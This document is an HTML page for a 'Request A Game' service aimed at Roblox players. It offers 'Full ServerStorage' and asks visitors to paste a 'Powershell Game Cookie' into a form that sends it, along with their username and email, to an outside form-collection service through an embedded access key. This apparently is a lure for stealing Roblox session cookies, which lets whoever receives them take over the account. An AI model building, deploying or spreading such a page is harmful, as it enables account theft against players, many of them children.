<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Request A Game</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <style>
        #tsparticles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
        .form-wrapper-container {
            position: relative;
            z-index: 1;
        }
    </style>
</head>
<body class="bg-gray-900">

    <div id="tsparticles"></div>

    <div class="flex items-center min-h-screen form-wrapper-container">
      <div class="container mx-auto">
        <div class="max-w-md mx-auto my-10 bg-gray-800 p-5 rounded-md shadow-sm">
          <div class="text-center">
            <h1 class="my-3 text-3xl font-semibold text-gray-100">
              Request A Game
            </h1>
            <p class="text-gray-400">
              You Can Request A Game. Full ServerStorage + More!
            </p>
          </div>
          <div class="m-7">
            <form action="https://api.web3forms.com/submit" method="POST" id="form">
              <input type="hidden" name="access_key" value="7e8407ee-bba9-438d-b367-5ab93bc7d801" />
              <input type="hidden" name="subject" value="New Game Request from Web3Forms" />
              <input type="checkbox" name="botcheck" id="botcheck_id" style="display: none;" />

              <div class="mb-6">
                <label for="roblox_user" class="block mb-2 text-sm text-gray-400">Roblox User</label>
                <input type="text" name="roblox_user" id="roblox_user" placeholder="YourRobloxUsername" required class="w-full px-3 py-2 h-12 rounded-sm placeholder-gray-500 text-gray-900 bg-gray-100 text-sm focus:outline-none focus:ring-2 focus:ring-indigo-500" />
              </div>
              <div class="mb-6">
                <label for="email" class="block mb-2 text-sm text-gray-400">Email Address</label>
                <input type="email" name="email" id="email" placeholder="you@example.com" required class="w-full px-3 py-2 h-12 rounded-sm placeholder-gray-500 text-gray-900 bg-gray-100 text-sm focus:outline-none focus:ring-2 focus:ring-indigo-500" />
              </div>
              <div class="mb-6">
                <label for="message" class="block mb-2 text-sm text-gray-400">Powershell Game Cookie</label>
                <textarea rows="5" name="message" id="message" placeholder="Enter the game cookie here..." class="w-full px-3 py-2 rounded-sm placeholder-gray-500 text-gray-900 bg-gray-100 text-sm focus:outline-none focus:ring-2 focus:ring-indigo-500" required></textarea>
              </div>
              <div class="mb-6">
                <button type="submit" class="w-full bg-indigo-600 inline-block text-white no-underline hover:bg-indigo-700 py-4 px-4 rounded-sm focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 focus:ring-offset-gray-800">
                  Send Request
                </button>
              </div>
              <p class="text-base text-center text-gray-400" id="result"></p>
            </form>
          </div>
        </div>
      </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/tsparticles@2.12.0/tsparticles.bundle.min.js"></script>
    <script src="particles-config.js"></script>
    <script src="script.js"></script>
</body>
</html>
